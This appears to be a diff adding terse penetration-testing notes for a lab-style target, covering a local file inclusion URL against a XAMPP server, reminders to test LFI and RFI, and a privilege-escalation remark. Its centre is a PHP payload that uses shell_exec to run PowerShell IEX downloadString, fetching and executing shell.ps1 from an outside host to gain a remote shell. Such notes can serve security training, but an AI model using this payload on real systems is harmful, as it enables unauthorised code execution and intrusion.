@@ -1,0 +1,19 @@
+http://192.168.221.53:8080/site/index.php?page=C:/xampp/htdocs/dashboard/phpinfo.php
+
+test lfi
+
+test rfi
+
+powershell need to be "" and not '', use \ in php or any programming language if necessary
+
+<?php
+$runCMD = "powershell \"IEX(New-Object Net.WebClient).downloadString('http://192.168.49.221/shell.ps1')\"";
+$output = shell_exec($runCMD);
+echo '<pre>' . $output . '</pre>';
+
+
+
+
+priv esc
+
+normal enumeration will get you there in 5mins :)
